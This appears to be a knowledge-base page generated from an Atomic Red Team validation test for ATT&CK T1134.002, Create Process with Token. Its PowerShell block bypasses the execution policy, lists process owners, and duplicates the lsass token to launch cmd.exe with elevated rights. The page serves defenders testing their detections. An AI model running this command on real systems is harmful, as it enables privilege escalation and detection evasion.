---
atomic_guid: "dbf4f5a9-b8e0-46a3-9841-9ad71247239e"
title: "Access Token Manipulation"
framework: "atomic"
generated: "true"
attack_technique_id: "T1134.002"
attack_technique_name: "Create Process with Token"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.002/T1134.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "dbf4f5a9-b8e0-46a3-9841-9ad71247239e"
  - "Access Token Manipulation"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Access Token Manipulation

This Action demonstrates how an access token for a specific program can spawn another program under a different owner. 
Adversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. 
This Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe

## Metadata

- Atomic GUID: dbf4f5a9-b8e0-46a3-9841-9ad71247239e
- Technique: T1134.002: Create Process with Token
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1134.002/T1134.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1134-access_token_manipulation|T1134.002]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Set-ExecutionPolicy -Scope Process Bypass -Force
$owners = @{}
gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
& "$PathToAtomicsFolder\T1134.002\src\GetToken.ps1"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.002/T1134.002.yaml)
